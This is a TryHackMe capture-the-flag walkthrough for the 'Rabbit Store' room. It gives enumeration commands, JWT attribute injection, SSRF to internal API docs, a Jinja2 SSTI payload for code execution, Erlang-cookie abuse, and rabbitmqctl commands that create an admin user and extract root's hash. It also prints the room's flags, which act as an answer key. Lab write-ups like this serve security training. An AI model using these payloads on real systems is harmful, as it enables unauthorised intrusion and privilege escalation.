# Rabbit Store - TryHackMe Walkthrough

## 1. Challenge Overview
**Name:** Rabbit Store  
**Category:** Web / SSRF / SSTI / PrivEsc  
**Difficulty:** Medium  
**Points/Reward:** N/A  
**Challenge Prompt:** 
> Demonstrate your web application testing skills and the basics of Linux to escalate your privileges.

---

## 2. Setup & Enumeration

**Initial Assessment:** 
We start with a target IP and add `cloudsite.thm` to our `/etc/hosts` file.

**Reconnaissance Tools:**
```bash
nmap -sC -sV -p- -T4 <TARGET_IP>
```

**Key Findings:**
* **Port 22**: SSH
* **Port 80**: HTTP (Apache) -> `cloudsite.thm`
* **Port 4369**: Erlang Port Mapper Daemon (epmd)
* **Port 25672**: RabbitMQ

**Subdomain Discovery:**
Fuzzing for subdomains reveals `storage.cloudsite.thm`.
```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cloudsite.thm/ -H "Host:FUZZ.cloudsite.thm" -fw 18
```

---

## 3. Exploitation

### Privileged Web Access (JWT Forgery)
1. Navigate to the signup page on `storage.cloudsite.thm`.
2. Intercept the signup request in Burp Suite.
3. Add `"subscription": "active"` to the JSON body.
4. Log in. The JWT token now contains an active subscription, allowing access to internal services.

### API Docs via SSRF
The `/api/store-url` endpoint is vulnerable to SSRF. We can use it to probe internal ports.
```python
# Scanning internal port 3000
test_url = "http://127.0.0.1:3000/api/docs"
data = {"url": test_url}
```
Accessing `http://127.0.0.1:3000/api/docs` reveals a hidden endpoint: `/api/fetch_messeges_from_chatbot`.

### SSTI to RCE
The chatbot endpoint is vulnerable to Jinja2 SSTI via the `username` parameter.
1. Send a POST request to `/api/fetch_messeges_from_chatbot`.
2. Payload: `{"username": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"}`.
3. This confirms RCE as user `azrael`.

---

## 4. Privilege Escalation

### User: azrael -> rabbitmq
1. Enumerate the system and find the Erlang cookie: `/var/lib/rabbitmq/.erlang.cookie`.
2. Use an Erlang distribution protocol exploit (e.g., `erl-matter`) with the cookie to gain code execution on port 25672.
3. Establish a reverse shell as the `rabbitmq` user.

### User: rabbitmq -> root
1. Correct the permissions of the Erlang cookie if necessary (`chmod 400`).
2. Use `rabbitmqctl` to create an admin user and export the definitions.
    ```bash
    rabbitmqctl add_user pwned pwned
    rabbitmqctl set_user_tags pwned administrator
    rabbitmqadmin export rabbit.definitions.json -u pwned -p pwned
    ```
3. Extract the `password_hash` for the `root` user from the exported JSON.
4. Decode the base64 hash and identify the SHA-256 portion.
5. The `root` user on the Linux system reuses the same SHA-256 hash as their password.
6. `su root` using the decoded hash to gain full access.

---

## 5. The Flags

**User Flag:** 
`98d3a30fa86523c580144d317be0c47e`

**Root Flag:** 
`eabf7a0b05d3f2028f3e0465d2fd0852`

---

## 6. Takeaways & Conclusion

* **JWT JSON Injection**: Always test if the backend blindly trusts additional attributes in JSON registration requests.
* **SSRF on Internal Documentation**: Internal-only documentation often contains sensitive endpoints or debug information.
* **Erlang Cookie Security**: The `.erlang.cookie` is a "magic" password for Erlang nodes. If leaked, it grants full RCE.
* **Credential Reuse**: System administrators often reuse hashes or passwords across different service layers.
